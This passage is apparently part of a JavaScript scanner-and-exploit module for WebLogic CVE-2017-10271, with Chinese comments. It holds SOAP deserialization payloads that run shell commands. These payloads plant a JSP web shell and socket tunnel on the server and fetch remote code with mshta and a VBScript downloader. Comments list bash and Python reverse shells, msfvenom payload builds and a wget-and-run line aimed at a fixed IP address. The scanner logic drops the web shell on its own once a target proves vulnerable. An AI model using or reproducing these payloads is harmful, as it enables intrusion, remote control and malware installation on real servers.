GVsc2UKICAgIHsKICAgICAgICB0cnkgewogICAgICAgIFN0cmluZyBzeklwID0gIiI7CiAgICAgICAgICAgIFNldDxJbmV0QWRkcmVzcz4gYWRkcnMgPSBuZXcgSGFzaFNldDxJbmV0QWRkcmVzcz4oKTsKICAgICAgICAgICAgRW51bWVyYXRpb248TmV0d29ya0ludGVyZmFjZT4gbnMgPSBudWxsOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgbnMgPSBOZXR3b3JrSW50ZXJmYWNlLmdldE5ldHdvcmtJbnRlcmZhY2VzKCk7CiAgICAgICAgICAgIH0gY2F0Y2ggKFNvY2tldEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICAvLyBpZ25vcmVkLi4uCiAgICAgICAgICAgIH0KICAgICAgICAgICAgd2hpbGUgKG5zICE9IG51bGwgJiYgbnMuaGFzTW9yZUVsZW1lbnRzKCkpIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBOZXR3b3JrSW50ZXJmYWNlIG4gPSBucy5uZXh0RWxlbWVudCgpOwogICAgICAgICAgICAgICAgRW51bWVyYXRpb248SW5ldEFkZHJlc3M+IGlzID0gbi5nZXRJbmV0QWRkcmVzc2VzKCk7CiAgICAgICAgICAgICAgICB3aGlsZSAoaXMuaGFzTW9yZUVsZW1lbnRzKCkpIHsKICAgICAgICAgICAgICAgICAgICBJbmV0QWRkcmVzcyBpID0gaXMubmV4dEVsZW1lbnQoKTsKICAgICAgICAgICAgICAgICAgICBpZiAoIWkuaXNMb29wYmFja0FkZHJlc3MoKSAmJiAhaS5pc0xpbmtMb2NhbEFkZHJlc3MoKSAmJiAhaS5pc011bHRpY2FzdEFkZHJlc3MoKSkgc3pJcCArPSAiLCIgKyBpLmdldEhvc3RBZGRyZXNzKCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgb3V0LnByaW50KCI8IS0tIGlwOiIgKyBzeklwICsgIiAtLT4iKTsgIAogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgIC8vIGlnbm9yZWQuLi4KICAgICAgICB9CgogICAgICAgIC8vUHJpbnRXcml0ZXIgbyA9IHJlc3BvbnNlLmdldFdyaXRlcigpOyAgCiAgICAgICAgb3V0LnByaW50KCI8IS0tIEdlb3JnIHNheXMsICdBbGwgc2VlbXMgZmluZScgLS0+Iik7IAogICAgfQolPg=='|base64 -d>/tmp/2188029.socks]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s3o = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void id="runOut" class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[echo 'PCVAcGFnZSBpbXBvcnQ9ImphdmEubmlvLkJ5dGVCdWZmZXIsIGphdmEubmV0LkluZXRTb2NrZXRBZGRyZXNzLCBqYXZhLm5pby5jaGFubmVscy5Tb2NrZXRDaGFubmVsLCBqYXZhLnV0aWwuQXJyYXlzLCBqYXZhLmlvLklPRXhjZXB0aW9uLCBqYXZhLm5ldC5Vbmtub3duSG9zdEV4Y2VwdGlvbiwgamF2YS5uZXQuU29ja2V0LGphdmEudXRpbC5IYXNoU2V0LGphdmEubmV0LkluZXRBZGRyZXNzLGphdmEubmV0Lk5ldHdvcmtJbnRlcmZhY2UsamF2YS5uZXQuU29ja2V0RXhjZXB0aW9uLGphdmEudXRpbC5FbnVtZXJhdGlvbixqYXZhLnV0aWwuSXRlcmF0b3IsamF2YS51dGlsLlNldCIgdHJpbURpcmVjdGl2ZVdoaXRlc3BhY2VzPSJ0cnVlIiU+PCUKICAgIFN0cmluZyBjbWQgPSByZXF1ZXN0LmdldEhlYWRlcigiWC1DTUQiKTsKICAgIGlmIChjbWQgIT0gbnVsbCkKICAgIHsKICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgaWYgKGNtZC5jb21wYXJlVG8oIkNPTk5FQ1QiKSA9PSAwKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBTdHJpbmcgdGFyZ2V0ID0gcmVxdWVzdC5nZXRIZWFkZXIoIlgtVEFSR0VUIik7CiAgICAgICAgICAgICAgICBpbnQgcG9ydCA9IEludGVnZXIucGFyc2VJbnQocmVxdWVzdC5nZXRIZWFkZXIoIlgtUE9SVCIpKTsKICAgICAgICAgICAgICAgIFNvY2tldENoYW5uZWwgc29ja2V0Q2hhbm5lbCA9IFNvY2tldENoYW5uZWwub3BlbigpOwogICAgICAgICAgICAgICAgc29ja2V0Q2hhbm5lbC5jb25uZWN0KG5ldyBJbmV0U29ja2V0QWRkcmVzcyh0YXJnZXQsIHBvcnQpKTsKICAgICAgICAgICAgICAgIHNvY2tldENoYW5uZWwuY29uZmlndXJlQmxvY2tpbmcoZmFsc2UpOwogICAgICAgICAgICAgICAgc2Vzc2lvbi5zZXRBdHRyaWJ1dGUoInNvY2tldCIsIHNvY2tldENoYW5uZWwpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICB9IGNhdGNoIChVbmtub3duSG9zdEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLUVSUk9SIiwgZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgIH0gY2F0Y2ggKElPRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihlLmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtRVJST1IiLCBlLmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtU1RBVFVTIiwgIkZBSUwiKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIGlmIChjbWQuY29tcGFyZVRvKCJESVNDT05ORUNUIikgPT0gMCkgewogICAgICAgICAgICBTb2NrZXRDaGFubmVsIHNvY2tldENoYW5uZWwgPSAoU29ja2V0Q2hhbm5lbClzZXNzaW9uLmdldEF0dHJpYnV0ZSgic29ja2V0Iik7CiAgICAgICAgICAgIHRyeXsKICAgICAgICAgICAgICAgIHNvY2tldENoYW5uZWwuc29ja2V0KCkuY2xvc2UoKTsKICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGV4KSB7CiAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZXguZ2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBzZXNzaW9uLmludmFsaWRhdGUoKTsKICAgICAgICB9IGVsc2UgaWYgKGNtZC5jb21wYXJlVG8oIlJFQUQiKSA9PSAwKXsKICAgICAgICAgICAgU29ja2V0Q2hhbm5lbCBzb2NrZXRDaGFubmVsID0gKFNvY2tldENoYW5uZWwpc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoInNvY2tldCIpOwogICAgICAgICAgICB0cnkgeyAgICAgICAgICAgIAogICAgICAgICAgICAgICAgQnl0ZUJ1ZmZlciBidWYgPSBCeXRlQnVmZmVyLmFsbG9jYXRlKDUxMik7CiAgICAgICAgICAgICAgICBpbnQgYnl0ZXNSZWFkID0gc29ja2V0Q2hhbm5lbC5yZWFkKGJ1Zik7CiAgICAgICAgICAgICAgICBTZXJ2bGV0T3V0cHV0U3RyZWFtIHNvID0gcmVzcG9uc2UuZ2V0T3V0cHV0U3RyZWFtKCk7CiAgICAgICAgICAgICAgICB3aGlsZSAoYnl0ZXNSZWFkID4gMCl7CiAgICAgICAgICAgICAgICAgICAgc28ud3JpdGUoYnVmLmFycmF5KCksMCxieXRlc1JlYWQpOwogICAgICAgICAgICAgICAgICAgIHNvLmZsdXNoKCk7CiAgICAgICAgICAgICAgICAgICAgYnVmLmNsZWFyKCk7CiAgICAgICAgICAgICAgICAgICAgYnl0ZXNSZWFkID0gc29ja2V0Q2hhbm5lbC5yZWFkKGJ1Zik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXNwb25zZS5zZXRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICBzby5mbHVzaCgpOwogICAgICAgICAgICAgICAgc28uY2xvc2UoKTsgICAgICAgICAgICAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKGUuZ2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgICAgIHJlc3BvbnNlLnNldEhlYWRlcigiWC1FUlJPUiIsIGUuZ2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgICAgIHJlc3BvbnNlLnNldEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgLy9zb2NrZXRDaGFubmVsLnNvY2tldCgpLmNsb3NlKCk7CiAgICAgICAgICAgIH0gICAgICAgIAogICAgICAgICAgICAKICAgICAgICB9IGVsc2UgaWYgKGNtZC5jb21wYXJlVG8oIkZPUldBUkQiKSA9PSAwKQogICAgICAgIHsKICAgICAgICAgICAgU29ja2V0Q2hhbm5lbCBzb2NrZXRDaGFubmVsID0gKFNvY2tldENoYW5uZWwpc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoInNvY2tldCIpOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpbnQgcmVhZGxlbiA9IHJlcXVlc3QuZ2V0Q29udGVudExlbmd0aCgpOwogICAgICAgICAgICAgICAgYnl0ZVtdIGJ1ZmYgPSBuZXcgYnl0ZVtyZWFkbGVuXTsKCiAgICAgICAgICAgICAgICByZXF1ZXN0LmdldElucHV0U3RyZWFtKCkucmVhZChidWZmLCAwLCByZWFkbGVuKTsKICAgICAgICAgICAgICAgIEJ5dGVCdWZmZXIgYnVmID0gQnl0ZUJ1ZmZlci5hbGxvY2F0ZShyZWFkbGVuKTsKICAgICAgICAgICAgICAgIGJ1Zi5jbGVhcigpOwogICAgICAgICAgICAgICAgYnVmLnB1dChidWZmKTsKICAgICAgICAgICAgICAgIGJ1Zi5mbGlwKCk7CgogICAgICAgICAgICAgICAgd2hpbGUoYnVmLmhhc1JlbWFpbmluZygpKSB7CiAgICAgICAgICAgICAgICAgICAgc29ja2V0Q2hhbm5lbC53cml0ZShidWYpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgLy9yZXNwb25zZS5nZXRPdXRwdXRTdHJlYW0oKS5jbG9zZSgpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICBTeXN0ZW0ub3V0LnByaW50bG4oZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLUVSUk9SIiwgZS5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAgICAgcmVzcG9uc2Uuc2V0SGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICBzb2NrZXRDaGFubmVsLnNvY2tldCgpLmNsb3NlKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9LyovIGluIGZpbHRlcgogICAgICAgIGVsc2UgCiAgICAgICAgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICBTdHJpbmcgc3pJcCA9ICIiOwogICAgICAgICAgICAgICAgU2V0PEluZXRBZGRyZXNzPiBhZGRycyA9IG5ldyBIYXNoU2V0PEluZXRBZGRyZXNzPigpOwogICAgICAgICAgICAgICAgRW51bWVyYXRpb248TmV0d29ya0ludGVyZmFjZT4gbnMgPSBudWxsOwogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBucyA9IE5ldHdvcmtJbnRlcmZhY2UuZ2V0TmV0d29ya0ludGVyZmFjZXMoKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKFNvY2tldEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICAgICAgLy8gaWdub3JlZC4uLgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgd2hpbGUgKG5zICE9IG51bGwgJiYgbnMuaGFzTW9yZUVsZW1lbnRzKCkpIAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIE5ldHdvcmtJbnRlcmZhY2UgbiA9IG5zLm5leHRFbGVtZW50KCk7CiAgICAgICAgICAgICAgICAgICAgRW51bWVyYXRpb248SW5ldEFkZHJlc3M+IGlzID0gbi5nZXRJbmV0QWRkcmVzc2VzKCk7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKGlzLmhhc01vcmVFbGVtZW50cygpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIEluZXRBZGRyZXNzIGkgPSBpcy5uZXh0RWxlbWVudCgpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWkuaXNMb29wYmFja0FkZHJlc3MoKSAmJiAhaS5pc0xpbmtMb2NhbEFkZHJlc3MoKSAmJiAhaS5pc011bHRpY2FzdEFkZHJlc3MoKSkgc3pJcCArPSAiLCIgKyBpLmdldEhvc3RBZGRyZXNzKCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgb3V0LnByaW50KCI8IS0tIGlwOiIgKyBzeklwICsgIiAtLT4iKTsgIAogICAgICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgICAgICAgICAgICAgLy8gaWdub3JlZC4uLgogICAgICAgICAgICB9CgogICAgICAgICAgICAvL1ByaW50V3JpdGVyIG8gPSByZXNwb25zZS5nZXRXcml0ZXIoKTsgIAogICAgICAgICAgICBvdXQucHJpbnQoIjwhLS0gR2Vvcmcgc2F5cywgJ0FsbCBzZWVtcyBmaW5lJyAtLT4iKTsgCiAgICAgICAgfQogICAgICAgIC8vLy8vLy8vLy8vLy8vKi8KICAgIH0vLyBpbiBqc3AKICAgIGVsc2UKICAgIHsKICAgICAgICB0cnkgewogICAgICAgIFN0cmluZyBzeklwID0gIiI7CiAgICAgICAgICAgIFNldDxJbmV0QWRkcmVzcz4gYWRkcnMgPSBuZXcgSGFzaFNldDxJbmV0QWRkcmVzcz4oKTsKICAgICAgICAgICAgRW51bWVyYXRpb248TmV0d29ya0ludGVyZmFjZT4gbnMgPSBudWxsOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgbnMgPSBOZXR3b3JrSW50ZXJmYWNlLmdldE5ldHdvcmtJbnRlcmZhY2VzKCk7CiAgICAgICAgICAgIH0gY2F0Y2ggKFNvY2tldEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICAvLyBpZ25vcmVkLi4uCiAgICAgICAgICAgIH0KICAgICAgICAgICAgd2hpbGUgKG5zICE9IG51bGwgJiYgbnMuaGFzTW9yZUVsZW1lbnRzKCkpIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBOZXR3b3JrSW50ZXJmYWNlIG4gPSBucy5uZXh0RWxlbWVudCgpOwogICAgICAgICAgICAgICAgRW51bWVyYXRpb248SW5ldEFkZHJlc3M+IGlzID0gbi5nZXRJbmV0QWRkcmVzc2VzKCk7CiAgICAgICAgICAgICAgICB3aGlsZSAoaXMuaGFzTW9yZUVsZW1lbnRzKCkpIHsKICAgICAgICAgICAgICAgICAgICBJbmV0QWRkcmVzcyBpID0gaXMubmV4dEVsZW1lbnQoKTsKICAgICAgICAgICAgICAgICAgICBpZiAoIWkuaXNMb29wYmFja0FkZHJlc3MoKSAmJiAhaS5pc0xpbmtMb2NhbEFkZHJlc3MoKSAmJiAhaS5pc011bHRpY2FzdEFkZHJlc3MoKSkgc3pJcCArPSAiLCIgKyBpLmdldEhvc3RBZGRyZXNzKCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgb3V0LnByaW50KCI8IS0tIGlwOiIgKyBzeklwICsgIiAtLT4iKTsgIAogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgIC8vIGlnbm9yZWQuLi4KICAgICAgICB9CgogICAgICAgIC8vUHJpbnRXcml0ZXIgbyA9IHJlc3BvbnNlLmdldFdyaXRlcigpOyAgCiAgICAgICAgb3V0LnByaW50KCI8IS0tIEdlb3JnIHNheXMsICdBbGwgc2VlbXMgZmluZScgLS0+Iik7IAogICAgfQolPg=='|base64 -d>/tmp/2188029.socks]]></string>
              </void>
            </array>
          <void method="start"/></void>
          <string id="innerValue">
            xx
          </string>
          <string id="response">
    A simpler way to get a value :)    &lt;br/&gt;
    with "<object idref="runOut"/>"   &lt;br/&gt;
    and "<object idref="innerValue"/>  &lt;br/&gt;
  </string>
  <object class="org.restlet.Response" method="getCurrent"> 
    <void method ="setEntity">
      <object idref = "response"/>
      <object class = "org.restlet.data.MediaType" field="TEXT_HTML"></object>
    </void>
  </object>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/})
,s3_1 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[find / -name "417.jsp"|xargs -I {} cp -f /tmp/2188029.socks {}]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s4 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>cmd.exe</string>
              </void>
              <void index="1">
                <string>/c</string>
              </void>
              <void index="2">
                <string><![CDATA[mshta http://hk-7.tk/1.jpg]]></string>
                <!--
                <string><![CDATA['del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://23.105.209.65/Lover1234_65.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs']]></string>
                -->
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s5 = _s.fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
  <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java version="1.8.0_131" class="java.beans.XMLDecoder">
        <object class="java.io.PrintWriter">
            <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/X11.jsp</string><void method="println">
              <string><![CDATA[<%@page import="java.util.*,java.io.*,java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket,java.util.HashSet,java.net.InetAddress,java.net.NetworkInterface,java.net.SocketException,java.util.Enumeration,java.util.Iterator,java.util.Set"%><%
String cmd = request.getParameter("ls");
if (cmd != null)
{
try{
Process p = Runtime.getRuntime().exec(cmd);
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ){
out.println(disr); disr = dis.readLine();}
} catch (Exception x) {}
}

    cmd = request.getHeader("X-CMD");
    if (cmd != null)
    {
        response.setHeader("X-STATUS", "OK");
        if (cmd.compareTo("CONNECT") == 0) {
            try {
                String target = request.getHeader("X-TARGET");
                int port = Integer.parseInt(request.getHeader("X-PORT"));
                SocketChannel socketChannel = SocketChannel.open();
                socketChannel.connect(new InetSocketAddress(target, port));
                socketChannel.configureBlocking(false);
                session.setAttribute("socket", socketChannel);
                response.setHeader("X-STATUS", "OK");
            } catch (UnknownHostException e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
            } catch (IOException e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
                
            }
        } else if (cmd.compareTo("DISCONNECT") == 0) {
            SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
            try{
                socketChannel.socket().close();
            } catch (Exception ex) {
                System.out.println(ex.getMessage());
            }
            session.invalidate();
        } else if (cmd.compareTo("READ") == 0){
            SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
            try {            
                ByteBuffer buf = ByteBuffer.allocate(512);
                int bytesRead = socketChannel.read(buf);
                ServletOutputStream so = response.getOutputStream();
                while (bytesRead > 0){
                    so.write(buf.array(),0,bytesRead);
                    so.flush();
                    buf.clear();
                    bytesRead = socketChannel.read(buf);
                }
                response.setHeader("X-STATUS", "OK");
                so.flush();
                so.close();            
                
            } catch (Exception e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
            }        
            
        } else if (cmd.compareTo("FORWARD") == 0)
        {
            SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
            try {
                
                int readlen = request.getContentLength();
                byte[] buff = new byte[readlen];

                request.getInputStream().read(buff, 0, readlen);
                ByteBuffer buf = ByteBuffer.allocate(readlen);
                buf.clear();
                buf.put(buff);
                buf.flip();

                while(buf.hasRemaining()) {
                    socketChannel.write(buf);
                }
                response.setHeader("X-STATUS", "OK");
            } catch (Exception e) {
                System.out.println(e.getMessage());
                response.setHeader("X-ERROR", e.getMessage());
                response.setHeader("X-STATUS", "FAIL");
                socketChannel.socket().close();
            }
        }
    }
    else
    {
        try {
        String szIp = "";
            Set<InetAddress> addrs = new HashSet<InetAddress>();
            Enumeration<NetworkInterface> ns = null;
            try {
                ns = NetworkInterface.getNetworkInterfaces();
            } catch (SocketException e) {
            }
            while (ns != null && ns.hasMoreElements()) 
            {
                NetworkInterface n = ns.nextElement();
                Enumeration<InetAddress> is = n.getInetAddresses();
                while (is.hasMoreElements()) {
                    InetAddress i = is.nextElement();
                    if (!i.isLoopbackAddress() && !i.isLinkLocalAddress() && !i.isMulticastAddress()) szIp += "," + i.getHostAddress();
                }
            }
            out.print("<!-- ip:" + szIp + " -->");  
        } catch (Exception e) {
        }
        out.print("<!-- Georg says, 'All seems fine' -->"); 
    }
%>]]></string></void><void method="close"/>
        </object>
    </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>

*/});
// 
// bash -i >& /dev/tcp/23.105.209.65/9999 0>&1
// python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("23.105.209.65",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

// msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=12345 LHOST=23.105.209.65 -f elf  -o ./linuxRvsTcp123.elf
// msfvenom -a x86 --platform linux -p  payload/linux/x86/shell/reverse_tcp LPORT=1234 LHOST=23.105.209.65  -e x86/shikata_ga_nai -b '\x00' -i 8 -f elf -o linuxRvsTcp123.elf
// x=linuxRvsTcp123.elf; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x}; chmod +x ${x}; ./${x} &

		var nNum = new Date().getTime()/1000,nTime = 0;
		// s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
		// 打开注释，测试存在漏洞的情况下，防火墙有没有限制主动向外连接
		// s = s5;
    var hst = _s.parseUrl(url);
    // console.log(s);

    // console.log(hst);
    var fnTmp1 = function(p11)
        {
           nNum = new Date().getTime()/1000,nTime = 0;
           nTime = (parseInt(Math.random() * 1000000000)%18 + 15) * 1000;
           s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
           url = szOld.substr(0, szOld.indexOf('/',13)) + p11;// '/wls-wsat/CoordinatorPortType'
          // console.log(url);
          var oOpt = _s.fnOptHeader({
            method: 'POST',
            uri: url,
            body:s
              ,headers:
              {
                "Host":hst.host,
                "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
                "Accept-Encoding":"zh-CN,zh",
                "content-type":"text/xml;charset=UTF-8"
              }});
          oOpt.timeout = nTime + 5000;
          _s.request(oOpt
            , function (error, response, body)
            {
              _s.error(error);
              body = body || String(error);
              if(-1 < String(body).indexOf("Invalid attribute for element void:class"))
              {
                _s.log("没有发现WebLogic CVE-2017-10271 反序列化，response.statusCode：" + (response && response.statusCode||body));

                return;
              }
              var nT = new Date().getTime()/1000 - nNum,nT2 = nTime / 1000 - 5;
              // console.log(String(body));
              // console.log([nT,nT2]);

              // console.log(response.headers);
              // console.log(body);
              
              if(nT >= nT2 && -1 < String(body).indexOf("<faultstring>0</faultstring>"))
              {
                var r = {vul:true,"body":String(body),href:response.request.uri.href,"url":szOld,"send":s,"des":
                  "发现高危漏洞 WebLogic CVE-2017-10271 反序列化, 延时" + (nTime/1000) + "秒，实际返回耗时：" + nT + "秒",
                  statusCode:(response && response.statusCode||0)};
                  // X-Powered-By,Set-Cookie,Date
                  // X-Pad: avoid browser bug
                // console.log(r);
                if(r.vul)
                {
                   if(s == s1_||global.X11){s1_ = null;return}// 确保只执行一次
                   else if(s != s1_ && s1_)
                   {
                       global.X11=true;
                       // all linux ok:
                       s = s1_;fnTmp1(aPath[0]);
                       // win is ok: /bea_wls_internal/X11.jsp?ls=netstat -ant
                       s = s5;fnTmp1(aPath[0]);
                   }
                }
                fnCbk(r,_t);
              }
              else _s.log("没有发现WebLogic CVE-2017-10271 反序列化，response.statusCode：" + (response && response.statusCode||body));
              //console.log(body);
             }
           );
        };
    for(var i = 0; i < aPath.length; i++)
    {
      fnTmp1(aPath[i]);
    }
	}
};